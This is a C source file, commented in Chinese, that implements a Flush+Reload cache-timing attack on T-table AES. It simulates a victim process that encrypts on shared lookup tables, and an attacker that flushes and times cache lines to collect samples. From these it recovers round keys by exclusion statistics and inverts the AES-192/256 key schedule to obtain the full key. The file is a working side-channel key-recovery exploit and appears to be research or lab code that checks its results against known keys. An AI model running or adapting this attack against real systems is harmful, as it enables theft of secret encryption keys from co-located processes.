/**
 * attack_common.c - AES Flush+Reload攻击共同实现
 */

#include "attack_common.h"
#include <xmmintrin.h>

extern uint8_t sbox[256];
extern uint8_t inv_sbox[256];

/* ==================== GF(2^8)乘法 ==================== */

uint8_t gmul(uint8_t a, uint8_t b) {
    uint8_t p = 0;
    for (int i = 0; i < 8; i++) {
        if (b & 1) p ^= a;
        uint8_t hi = a & 0x80;
        a <<= 1;
        if (hi) a ^= 0x1b;
        b >>= 1;
    }
    return p;
}

/* ==================== 辅助函数 ==================== */

void compute_expected_last_round_key(const uint8_t *key, int key_bits, uint8_t *k_last) {
    AES_CTX ctx;
    AES_set_encrypt_key(key, key_bits, &ctx);
    int rounds = ctx.rounds;
    int rk_offset = rounds * 4;
    for (int i = 0; i < 16; i++) {
        k_last[i] = (ctx.rk[rk_offset + i/4] >> (24 - (i % 4) * 8)) & 0xff;
    }
}

/* ==================== T表初始化 ==================== */

void init_t_tables(SharedTTables *shm) {
    for (int i = 0; i < 256; i++) {
        uint8_t s = sbox[i];
        uint8_t gmul2 = (s & 0x80) ? ((s << 1) ^ 0x1b) : (s << 1);
        uint8_t gmul3 = gmul2 ^ s;
        
        shm->Te0.data[i] = ((uint32_t)gmul2 << 24) | ((uint32_t)s << 16) | ((uint32_t)s << 8) | (uint32_t)gmul3;
        shm->Te1.data[i] = ((uint32_t)gmul3 << 24) | ((uint32_t)gmul2 << 16) | ((uint32_t)s << 8) | (uint32_t)s;
        shm->Te2.data[i] = ((uint32_t)s << 24) | ((uint32_t)gmul3 << 16) | ((uint32_t)gmul2 << 8) | (uint32_t)s;
        shm->Te3.data[i] = ((uint32_t)s << 24) | ((uint32_t)s << 16) | ((uint32_t)gmul3 << 8) | (uint32_t)gmul2;
        
        uint8_t inv_s = inv_sbox[i];
        shm->Td0.data[i] = ((uint32_t)gmul(inv_s, 0x0e) << 24) | ((uint32_t)gmul(inv_s, 0x09) << 16) | 
                           ((uint32_t)gmul(inv_s, 0x0d) << 8) | (uint32_t)gmul(inv_s, 0x0b);
        shm->Td1.data[i] = ((uint32_t)gmul(inv_s, 0x0b) << 24) | ((uint32_t)gmul(inv_s, 0x0e) << 16) | 
                           ((uint32_t)gmul(inv_s, 0x09) << 8) | (uint32_t)gmul(inv_s, 0x0d);
        shm->Td2.data[i] = ((uint32_t)gmul(inv_s, 0x0d) << 24) | ((uint32_t)gmul(inv_s, 0x0b) << 16) | 
                           ((uint32_t)gmul(inv_s, 0x0e) << 8) | (uint32_t)gmul(inv_s, 0x09);
        shm->Td3.data[i] = ((uint32_t)gmul(inv_s, 0x09) << 24) | ((uint32_t)gmul(inv_s, 0x0d) << 16) | 
                           ((uint32_t)gmul(inv_s, 0x0b) << 8) | (uint32_t)gmul(inv_s, 0x0e);
        shm->Td4[i] = inv_s;
    }
    shm->initialized = 1;
}

/* ==================== Victim加密函数 ==================== */

void victim_encrypt(SharedTTables *victim_shm, AES_CTX *ctx, uint8_t *ciphertext) {
    uint8_t plaintext[16];
    for (int i = 0; i < 16; i++) {
        plaintext[i] = rand() & 0xFF;
    }
    
    uint32_t s0, s1, s2, s3;
    uint32_t t0, t1, t2, t3;
    
    s0 = ((uint32_t)plaintext[0] << 24) | ((uint32_t)plaintext[1] << 16) | 
         ((uint32_t)plaintext[2] << 8) | (uint32_t)plaintext[3];
    s1 = ((uint32_t)plaintext[4] << 24) | ((uint32_t)plaintext[5] << 16) | 
         ((uint32_t)plaintext[6] << 8) | (uint32_t)plaintext[7];
    s2 = ((uint32_t)plaintext[8] << 24) | ((uint32_t)plaintext[9] << 16) | 
         ((uint32_t)plaintext[10] << 8) | (uint32_t)plaintext[11];
    s3 = ((uint32_t)plaintext[12] << 24) | ((uint32_t)plaintext[13] << 16) | 
         ((uint32_t)plaintext[14] << 8) | (uint32_t)plaintext[15];
    
    s0 ^= ctx->rk[0]; s1 ^= ctx->rk[1]; s2 ^= ctx->rk[2]; s3 ^= ctx->rk[3];
    
    for (int r = 1; r < ctx->rounds; r++) {
        t0 = victim_shm->Te0.data[(s0 >> 24) & 0xff] ^ 
             victim_shm->Te1.data[(s1 >> 16) & 0xff] ^
             victim_shm->Te2.data[(s2 >> 8) & 0xff] ^ 
             victim_shm->Te3.data[s3 & 0xff] ^ ctx->rk[r*4];
        t1 = victim_shm->Te0.data[(s1 >> 24) & 0xff] ^ 
             victim_shm->Te1.data[(s2 >> 16) & 0xff] ^
             victim_shm->Te2.data[(s3 >> 8) & 0xff] ^ 
             victim_shm->Te3.data[s0 & 0xff] ^ ctx->rk[r*4+1];
        t2 = victim_shm->Te0.data[(s2 >> 24) & 0xff] ^ 
             victim_shm->Te1.data[(s3 >> 16) & 0xff] ^
             victim_shm->Te2.data[(s0 >> 8) & 0xff] ^ 
             victim_shm->Te3.data[s1 & 0xff] ^ ctx->rk[r*4+2];
        t3 = victim_shm->Te0.data[(s3 >> 24) & 0xff] ^ 
             victim_shm->Te1.data[(s0 >> 16) & 0xff] ^
             victim_shm->Te2.data[(s1 >> 8) & 0xff] ^ 
             victim_shm->Te3.data[s2 & 0xff] ^ ctx->rk[r*4+3];
        s0 = t0; s1 = t1; s2 = t2; s3 = t3;
    }
    
    t0 = (victim_shm->Te2.data[(s0 >> 24) & 0xff] & 0xff000000) |
         (victim_shm->Te3.data[(s1 >> 16) & 0xff] & 0x00ff0000) |
         (victim_shm->Te0.data[(s2 >> 8) & 0xff] & 0x0000ff00) |
         (victim_shm->Te1.data[s3 & 0xff] & 0x000000ff);
    t1 = (victim_shm->Te2.data[(s1 >> 24) & 0xff] & 0xff000000) |
         (victim_shm->Te3.data[(s2 >> 16) & 0xff] & 0x00ff0000) |
         (victim_shm->Te0.data[(s3 >> 8) & 0xff] & 0x0000ff00) |
         (victim_shm->Te1.data[s0 & 0xff] & 0x000000ff);
    t2 = (victim_shm->Te2.data[(s2 >> 24) & 0xff] & 0xff000000) |
         (victim_shm->Te3.data[(s3 >> 16) & 0xff] & 0x00ff0000) |
         (victim_shm->Te0.data[(s0 >> 8) & 0xff] & 0x0000ff00) |
         (victim_shm->Te1.data[s1 & 0xff] & 0x000000ff);
    t3 = (victim_shm->Te2.data[(s3 >> 24) & 0xff] & 0xff000000) |
         (victim_shm->Te3.data[(s0 >> 16) & 0xff] & 0x00ff0000) |
         (victim_shm->Te0.data[(s1 >> 8) & 0xff] & 0x0000ff00) |
         (victim_shm->Te1.data[s2 & 0xff] & 0x000000ff);
    
    int rk_offset = ctx->rounds * 4;
    t0 ^= ctx->rk[rk_offset]; t1 ^= ctx->rk[rk_offset+1]; 
    t2 ^= ctx->rk[rk_offset+2]; t3 ^= ctx->rk[rk_offset+3];
    
    ciphertext[0] = (t0 >> 24) & 0xff; ciphertext[1] = (t0 >> 16) & 0xff;
    ciphertext[2] = (t0 >> 8) & 0xff; ciphertext[3] = t0 & 0xff;
    ciphertext[4] = (t1 >> 24) & 0xff; ciphertext[5] = (t1 >> 16) & 0xff;
    ciphertext[6] = (t1 >> 8) & 0xff; ciphertext[7] = t1 & 0xff;
    ciphertext[8] = (t2 >> 24) & 0xff; ciphertext[9] = (t2 >> 16) & 0xff;
    ciphertext[10] = (t2 >> 8) & 0xff; ciphertext[11] = t2 & 0xff;
    ciphertext[12] = (t3 >> 24) & 0xff; ciphertext[13] = (t3 >> 16) & 0xff;
    ciphertext[14] = (t3 >> 8) & 0xff; ciphertext[15] = t3 & 0xff;
}

/* ==================== 样本收集 ==================== */

void collect_samples(
    SharedTTables *shm,
    int pipe_to_victim[2],
    int pipe_to_attacker[2],
    int num_samples,
    uint64_t threshold,
    AttackSamples *samples,
    int noise_level
) {
    memset(samples, 0, sizeof(AttackSamples));
    
    char cmd = 'E';
    char resp;
    uint64_t sample_start = rdtsc();
    
    for (int t = 0; t < num_samples; t++) {
        flush_cache_line(&shm->Te0.data[0]);
        flush_cache_line(&shm->Te1.data[0]);
        flush_cache_line(&shm->Te2.data[0]);
        flush_cache_line(&shm->Te3.data[0]);
        asm volatile ("mfence" ::: "memory");
        
        write(pipe_to_victim[1], &cmd, 1);
        read(pipe_to_attacker[0], &resp, 1);
        
        asm volatile ("mfence; lfence" ::: "memory");
        
        uint64_t times[4];
        times[0] = measure_time_single(&shm->Te0.data[0]);
        times[1] = measure_time_single(&shm->Te1.data[0]);
        times[2] = measure_time_single(&shm->Te2.data[0]);
        times[3] = measure_time_single(&shm->Te3.data[0]);
        
        for (int i = 0; i < 4; i++) {
            samples->X[i][t] = (times[i] < threshold) ? 1 : 0;
            if (samples->X[i][t] == 0) {
                samples->no_access_count[i]++;
            }
            
            if (times[i] < threshold) {
                if (samples->hit_count < MAX_SAMPLES * 4) {
                    samples->hit_times[samples->hit_count++] = times[i];
                }
            } else {
                if (samples->miss_count < MAX_SAMPLES * 4) {
                    samples->miss_times[samples->miss_count++] = times[i];
                }
            }
        }
        
        int has_no_access = 0;
        for (int i = 0; i < 4; i++) {
            if (samples->X[i][t] == 0) {
                has_no_access = 1;
                break;
            }
        }
        if (has_no_access) {
            samples->useful_samples++;
        }
        
        get_current_ciphertext(shm, samples->ciphertexts[t]);
        samples->collected++;
        
        if ((t + 1) % 1000 == 0) {
            int total_no_access = samples->no_access_count[0] + samples->no_access_count[1] +
                                  samples->no_access_count[2] + samples->no_access_count[3];
            double avg_rate = 100.0 * total_no_access / (4 * samples->collected);
            printf("Collected %d/%d samples (avg no-access: %.1f%%)\r", 
                   t + 1, num_samples, avg_rate);
            fflush(stdout);
        }
    }
    
    samples->total_sample_cycles = rdtsc() - sample_start;
    (void)noise_level;
}

void print_statistics(AttackSamples *samples) {
    printf("\n\nStatistics:\n");
    for (int i = 0; i < 4; i++) {
        printf("Te%d no-access rate: %.1f%% (%d samples)\n", 
               i, 100.0 * samples->no_access_count[i] / samples->collected, samples->no_access_count[i]);
    }
}

/* ==================== Victim进程 ==================== */

void victim_process(
    SharedTTables *victim_shm,
    int pipe_to_victim[2],
    int pipe_to_attacker[2],
    const uint8_t *key,
    int key_bits,
    int num_samples,
    int pin_core,
    int noise_level,
    int cache_flush,
    PerformanceMetrics *perf
) {
    close(pipe_to_victim[1]);
    close(pipe_to_attacker[0]);
    
    if (pin_core) {
        pin_to_core(0);
    }
    
    AES_CTX ctx;
    AES_set_encrypt_key(key, key_bits, &ctx);
    
    srand(time(NULL) ^ getpid());
    unsigned int noise_seed = time(NULL) ^ (getpid() * 1337);
    
    int noise_access_prob = 0;
    if (noise_level == 1) noise_access_prob = 30;
    else if (noise_level == 2) noise_access_prob = 40;
    else if (noise_level == 3) noise_access_prob = 50;
    
    uint64_t total_cycles = 0;
    uint64_t encrypt_count = 0;
    
    char cmd;
    char resp = 'D';
    
    for (int t = 0; t < num_samples; t++) {
        read(pipe_to_victim[0], &cmd, 1);
        
        uint8_t ciphertext[16];
        
        uint64_t start = rdtsc();
        victim_encrypt(victim_shm, &ctx, ciphertext);
        uint64_t end = rdtsc();
        
        total_cycles += (end - start);
        encrypt_count++;
        
        store_current_ciphertext(victim_shm, ciphertext);
        
        if (noise_level > 0) {
            if ((rand_r(&noise_seed) % 100) < noise_access_prob) {
                volatile uint32_t dummy = victim_shm->Te0.data[rand_r(&noise_seed) % 16];
                (void)dummy;
            }
            if ((rand_r(&noise_seed) % 100) < noise_access_prob) {
                volatile uint32_t dummy = victim_shm->Te1.data[rand_r(&noise_seed) % 16];
                (void)dummy;
            }
            if ((rand_r(&noise_seed) % 100) < noise_access_prob) {
                volatile uint32_t dummy = victim_shm->Te2.data[rand_r(&noise_seed) % 16];
                (void)dummy;
            }
            if ((rand_r(&noise_seed) % 100) < noise_access_prob) {
                volatile uint32_t dummy = victim_shm->Te3.data[rand_r(&noise_seed) % 16];
                (void)dummy;
            }
            _mm_mfence();
        }
        
        if (cache_flush) {
            _mm_clflush(&victim_shm->Te0.data[0]);
            _mm_clflush(&victim_shm->Te1.data[0]);
            _mm_clflush(&victim_shm->Te2.data[0]);
            _mm_clflush(&victim_shm->Te3.data[0]);
            _mm_mfence();
            _mm_lfence();
            for (volatile int delay = 0; delay < 100; delay++);
            _mm_clflush(&victim_shm->Te0.data[0]);
            _mm_clflush(&victim_shm->Te1.data[0]);
            _mm_clflush(&victim_shm->Te2.data[0]);
            _mm_clflush(&victim_shm->Te3.data[0]);
            _mm_mfence();
            _mm_lfence();
        }
        
        write(pipe_to_attacker[1], &resp, 1);
    }
    
    if (perf && encrypt_count > 0) {
        perf->total_encrypt_cycles = total_cycles;
        perf->encrypt_count = encrypt_count;
        perf->avg_encrypt_cycles = (double)total_cycles / encrypt_count;
        perf->encrypt_throughput = (16.0 * encrypt_count / 1024 / 1024) / 
                                   ((double)total_cycles / 2900000000.0);
    }
    
    detach_shared_memory(victim_shm);
    close(pipe_to_victim[0]);
    close(pipe_to_attacker[1]);
    exit(0);
}

/* ==================== 排除法密钥恢复 ==================== */

void exclusion_recover_key(
    int X[4][MAX_SAMPLES],
    uint8_t ciphertexts[MAX_SAMPLES][16],
    int num_samples,
    uint8_t K_last[16],
    uint8_t *expected_k
) {
    int CK[16][256];
    memset(CK, 0, sizeof(CK));
    
    int useful_samples = 0;

    for (int t = 0; t < num_samples; t++) {
        int has_no_access = 0;
        for (int i = 0; i < 4; i++) {
            if (X[i][t] == 0) {
                has_no_access = 1;
                break;
            }
        }
        
        if (!has_no_access) continue;
        
        useful_samples++;

        for (int table_idx = 0; table_idx < 4; table_idx++) {
            if (X[table_idx][t] == 0) {
                int row = (table_idx + 2) % 4;
                
                for (int l = 0; l < T_ENTRIES_PER_CACHE_LINE; l++) {
                    uint8_t s_box_val = sbox[l];
                    
                    for (int j = 0; j < 4; j++) {
                        int byte_pos = row + 4*j;
                        uint8_t ct_byte = ciphertexts[t][byte_pos];
                        
                        uint8_t excluded_k = ct_byte ^ s_box_val;
                        CK[byte_pos][excluded_k]++;
                    }
                }
            }
        }
    }
    
    printf("Useful samples (with at least one no-access): %d\n", useful_samples);

    printf("\nCK Statistics for each key byte:\n");
    for (int byte_idx = 0; byte_idx < 16; byte_idx++) {
        int expected = expected_k[byte_idx];
        int expected_count = CK[byte_idx][expected];
        int min_count = CK[byte_idx][0];
        int max_count = 0;
        uint8_t best = 0;
        
        for (int k = 1; k < 256; k++) {
            if (CK[byte_idx][k] < min_count) {
                min_count = CK[byte_idx][k];
                best = k;
            }
            if (CK[byte_idx][k] > max_count) {
                max_count = CK[byte_idx][k];
            }
        }
        
        printf("Byte %2d: expected=%02x(count=%d), recovered=%02x(count=%d), min=%d, max=%d, diff=%d\n",
               byte_idx, expected, expected_count, best, min_count, min_count, max_count, 
               expected_count - min_count);
    }

    for (int byte_idx = 0; byte_idx < 16; byte_idx++) {
        int min_count = CK[byte_idx][0];
        uint8_t candidates[256];
        int num_candidates = 0;
        
        for (int k = 0; k < 256; k++) {
            if (CK[byte_idx][k] < min_count) {
                min_count = CK[byte_idx][k];
                num_candidates = 0;
                candidates[num_candidates++] = k;
            } else if (CK[byte_idx][k] == min_count) {
                candidates[num_candidates++] = k;
            }
        }
        
        if (num_candidates == 1) {
            K_last[byte_idx] = candidates[0];
        } else {
            K_last[byte_idx] = candidates[0];
        }
    }
}

/* ==================== EBD攻击算法 ==================== */

void ebd_recover_kd1(
    SharedTTables *shm,
    int X[4][MAX_SAMPLES],
    uint8_t ciphertexts[MAX_SAMPLES][16],
    int num_samples,
    uint8_t K_last[16],
    uint8_t Kd1[16],
    uint8_t *expected_kd1
) {
    int CKd1[16][256];
    memset(CKd1, 0, sizeof(CKd1));
    
    uint32_t Kd0[4];
    for (int i = 0; i < 4; i++) {
        Kd0[i] = ((uint32_t)K_last[4*i] << 24) | ((uint32_t)K_last[4*i+1] << 16) |
                 ((uint32_t)K_last[4*i+2] << 8) | (uint32_t)K_last[4*i+3];
    }
    
    int useful_samples = 0;
    
    for (int t = 0; t < num_samples; t++) {
        int has_no_access = 0;
        for (int i = 0; i < 4; i++) {
            if (X[i][t] == 0) {
                has_no_access = 1;
                break;
            }
        }
        
        if (!has_no_access) continue;
        useful_samples++;
        
        uint32_t D0[4];
        D0[0] = ((uint32_t)ciphertexts[t][0] << 24) | ((uint32_t)ciphertexts[t][1] << 16) |
                ((uint32_t)ciphertexts[t][2] << 8) | (uint32_t)ciphertexts[t][3];
        D0[1] = ((uint32_t)ciphertexts[t][4] << 24) | ((uint32_t)ciphertexts[t][5] << 16) |
                ((uint32_t)ciphertexts[t][6] << 8) | (uint32_t)ciphertexts[t][7];
        D0[2] = ((uint32_t)ciphertexts[t][8] << 24) | ((uint32_t)ciphertexts[t][9] << 16) |
                ((uint32_t)ciphertexts[t][10] << 8) | (uint32_t)ciphertexts[t][11];
        D0[3] = ((uint32_t)ciphertexts[t][12] << 24) | ((uint32_t)ciphertexts[t][13] << 16) |
                ((uint32_t)ciphertexts[t][14] << 8) | (uint32_t)ciphertexts[t][15];
        
        uint32_t D1[4];
        D1[0] = D0[0] ^ Kd0[0];
        D1[1] = D0[1] ^ Kd0[1];
        D1[2] = D0[2] ^ Kd0[2];
        D1[3] = D0[3] ^ Kd0[3];
        
        uint32_t IV1[4];
        IV1[0] = shm->Td0.data[(D1[0] >> 24) & 0xff] ^
                 shm->Td1.data[(D1[3] >> 16) & 0xff] ^
                 shm->Td2.data[(D1[2] >> 8) & 0xff] ^
                 shm->Td3.data[D1[1] & 0xff];
        IV1[1] = shm->Td0.data[(D1[1] >> 24) & 0xff] ^
                 shm->Td1.data[(D1[0] >> 16) & 0xff] ^
                 shm->Td2.data[(D1[3] >> 8) & 0xff] ^
                 shm->Td3.data[D1[2] & 0xff];
        IV1[2] = shm->Td0.data[(D1[2] >> 24) & 0xff] ^
                 shm->Td1.data[(D1[1] >> 16) & 0xff] ^
                 shm->Td2.data[(D1[0] >> 8) & 0xff] ^
                 shm->Td3.data[D1[3] & 0xff];
        IV1[3] = shm->Td0.data[(D1[3] >> 24) & 0xff] ^
                 shm->Td1.data[(D1[2] >> 16) & 0xff] ^
                 shm->Td2.data[(D1[1] >> 8) & 0xff] ^
                 shm->Td3.data[D1[0] & 0xff];
        
        for (int table_idx = 0; table_idx < 4; table_idx++) {
            if (X[table_idx][t] == 0) {
                for (int l = 0; l < T_ENTRIES_PER_CACHE_LINE; l++) {
                    uint8_t s_val = sbox[l];
                    
                    for (int j = 0; j < 4; j++) {
                        int byte_pos = table_idx + 4*j;
                        int col = j;
                        int row = table_idx;
                        
                        uint8_t iv1_byte = (IV1[col] >> (24 - row*8)) & 0xff;
                        uint8_t excluded_kd1 = iv1_byte ^ s_val;
                        CKd1[byte_pos][excluded_kd1]++;
                    }
                }
            }
        }
    }
    
    printf("EBD useful samples: %d\n", useful_samples);
    
    printf("\nKd1 CK Statistics:\n");
    for (int byte_idx = 0; byte_idx < 16; byte_idx++) {
        int expected = expected_kd1 ? expected_kd1[byte_idx] : -1;
        int expected_count = expected >= 0 ? CKd1[byte_idx][expected] : -1;
        int min_count = CKd1[byte_idx][0];
        int max_count = 0;
        uint8_t best = 0;
        
        for (int k = 1; k < 256; k++) {
            if (CKd1[byte_idx][k] < min_count) {
                min_count = CKd1[byte_idx][k];
                best = k;
            }
            if (CKd1[byte_idx][k] > max_count) {
                max_count = CKd1[byte_idx][k];
            }
        }
        
        if (expected >= 0) {
            printf("Byte %2d: expected=%02x(count=%d), recovered=%02x(count=%d), diff=%d\n",
                   byte_idx, expected, expected_count, best, min_count, expected_count - min_count);
        } else {
            printf("Byte %2d: recovered=%02x(count=%d), min=%d, max=%d\n",
                   byte_idx, best, min_count, min_count, max_count);
        }
    }
    
    for (int byte_idx = 0; byte_idx < 16; byte_idx++) {
        int min_count = CKd1[byte_idx][0];
        uint8_t best = 0;
        for (int k = 1; k < 256; k++) {
            if (CKd1[byte_idx][k] < min_count) {
                min_count = CKd1[byte_idx][k];
                best = k;
            }
        }
        Kd1[byte_idx] = best;
    }
}

/* ==================== 密钥转换函数 ==================== */

void kd1_to_k11(uint8_t Kd1[16], uint8_t K11[16]) {
    for (int col = 0; col < 4; col++) {
        uint8_t b0 = Kd1[col*4];
        uint8_t b1 = Kd1[col*4 + 1];
        uint8_t b2 = Kd1[col*4 + 2];
        uint8_t b3 = Kd1[col*4 + 3];
        
        K11[col*4]     = gmul(b0, 0x02) ^ gmul(b1, 0x03) ^ b2 ^ b3;
        K11[col*4 + 1] = b0 ^ gmul(b1, 0x02) ^ gmul(b2, 0x03) ^ b3;
        K11[col*4 + 2] = b0 ^ b1 ^ gmul(b2, 0x02) ^ gmul(b3, 0x03);
        K11[col*4 + 3] = gmul(b0, 0x03) ^ b1 ^ b2 ^ gmul(b3, 0x02);
    }
}

void kd1_to_k13(uint8_t Kd1[16], uint8_t K13[16]) {
    for (int col = 0; col < 4; col++) {
        uint8_t b0 = Kd1[col*4];
        uint8_t b1 = Kd1[col*4 + 1];
        uint8_t b2 = Kd1[col*4 + 2];
        uint8_t b3 = Kd1[col*4 + 3];
        
        K13[col*4]     = gmul(b0, 0x02) ^ gmul(b1, 0x03) ^ b2 ^ b3;
        K13[col*4 + 1] = b0 ^ gmul(b1, 0x02) ^ gmul(b2, 0x03) ^ b3;
        K13[col*4 + 2] = b0 ^ b1 ^ gmul(b2, 0x02) ^ gmul(b3, 0x03);
        K13[col*4 + 3] = gmul(b0, 0x03) ^ b1 ^ b2 ^ gmul(b3, 0x02);
    }
}

/* ==================== 预期值计算函数 ==================== */

void compute_expected_kd1(const uint8_t *key, int key_bits, uint8_t *kd1) {
    AES_CTX enc_ctx, dec_ctx;
    AES_set_encrypt_key(key, key_bits, &enc_ctx);
    AES_set_decrypt_key(key, key_bits, &dec_ctx);
    
    for (int i = 0; i < 16; i++) {
        kd1[i] = (dec_ctx.rk[4 + i/4] >> (24 - (i % 4) * 8)) & 0xff;
    }
}

void compute_expected_k11(const uint8_t *key, int key_bits, uint8_t *k11) {
    AES_CTX ctx;
    AES_set_encrypt_key(key, key_bits, &ctx);
    
    int rk_offset = 11 * 4;
    for (int i = 0; i < 16; i++) {
        k11[i] = (ctx.rk[rk_offset + i/4] >> (24 - (i % 4) * 8)) & 0xff;
    }
}

void compute_expected_k13(const uint8_t *key, uint8_t *k13) {
    AES_CTX ctx;
    AES_set_encrypt_key(key, 256, &ctx);
    
    int rk_offset = 13 * 4;
    for (int i = 0; i < 16; i++) {
        k13[i] = (ctx.rk[rk_offset + i/4] >> (24 - (i % 4) * 8)) & 0xff;
    }
}

/* ==================== 逆向密钥扩展 ==================== */

int recover_original_key_aes192_full(
    uint8_t K12[16],
    uint8_t K11[16],
    uint8_t original_key[24]
) {
    uint32_t W[52];
    memset(W, 0, sizeof(W));
    
    for (int i = 0; i < 4; i++) {
        W[44 + i] = ((uint32_t)K11[4*i] << 24) | ((uint32_t)K11[4*i+1] << 16) |
                    ((uint32_t)K11[4*i+2] << 8) | (uint32_t)K11[4*i+3];
        W[48 + i] = ((uint32_t)K12[4*i] << 24) | ((uint32_t)K12[4*i+1] << 16) |
                    ((uint32_t)K12[4*i+2] << 8) | (uint32_t)K12[4*i+3];
    }
    
    for (int i = 51; i >= 6; i--) {
        uint32_t temp = W[i-1];
        
        if (i % 6 == 0) {
            temp = (temp << 8) | (temp >> 24);
            temp = ((uint32_t)sbox[(temp >> 24) & 0xff] << 24) |
                   ((uint32_t)sbox[(temp >> 16) & 0xff] << 16) |
                   ((uint32_t)sbox[(temp >> 8) & 0xff] << 8) |
                   (uint32_t)sbox[temp & 0xff];
            
            uint8_t rc = 1;
            int rc_idx = i / 6;
            for (int j = 1; j < rc_idx; j++) {
                rc = (rc & 0x80) ? ((rc << 1) ^ 0x1b) : (rc << 1);
            }
            temp ^= ((uint32_t)rc << 24);
        }
        
        W[i-6] = W[i] ^ temp;
    }
    
    for (int i = 0; i < 6; i++) {
        original_key[4*i] = (W[i] >> 24) & 0xff;
        original_key[4*i+1] = (W[i] >> 16) & 0xff;
        original_key[4*i+2] = (W[i] >> 8) & 0xff;
        original_key[4*i+3] = W[i] & 0xff;
    }
    
    return 0;
}

int recover_original_key_aes256_full(
    uint8_t K14[16],
    uint8_t K13[16],
    uint8_t original_key[32]
) {
    uint32_t W[60];
    memset(W, 0, sizeof(W));
    
    for (int i = 0; i < 4; i++) {
        W[52 + i] = ((uint32_t)K13[4*i] << 24) | ((uint32_t)K13[4*i+1] << 16) |
                    ((uint32_t)K13[4*i+2] << 8) | (uint32_t)K13[4*i+3];
        W[56 + i] = ((uint32_t)K14[4*i] << 24) | ((uint32_t)K14[4*i+1] << 16) |
                    ((uint32_t)K14[4*i+2] << 8) | (uint32_t)K14[4*i+3];
    }
    
    for (int i = 59; i >= 8; i--) {
        uint32_t temp = W[i-1];
        
        if (i % 8 == 0) {
            temp = (temp << 8) | (temp >> 24);
            temp = ((uint32_t)sbox[(temp >> 24) & 0xff] << 24) |
                   ((uint32_t)sbox[(temp >> 16) & 0xff] << 16) |
                   ((uint32_t)sbox[(temp >> 8) & 0xff] << 8) |
                   (uint32_t)sbox[temp & 0xff];
            
            uint8_t rc = 1;
            int rc_idx = i / 8;
            for (int j = 1; j < rc_idx; j++) {
                rc = (rc & 0x80) ? ((rc << 1) ^ 0x1b) : (rc << 1);
            }
            temp ^= ((uint32_t)rc << 24);
        } else if (i % 8 == 4) {
            temp = ((uint32_t)sbox[(temp >> 24) & 0xff] << 24) |
                   ((uint32_t)sbox[(temp >> 16) & 0xff] << 16) |
                   ((uint32_t)sbox[(temp >> 8) & 0xff] << 8) |
                   (uint32_t)sbox[temp & 0xff];
        }
        
        W[i-8] = W[i] ^ temp;
    }
    
    for (int i = 0; i < 8; i++) {
        original_key[4*i] = (W[i] >> 24) & 0xff;
        original_key[4*i+1] = (W[i] >> 16) & 0xff;
        original_key[4*i+2] = (W[i] >> 8) & 0xff;
        original_key[4*i+3] = W[i] & 0xff;
    }
    
    return 0;
}
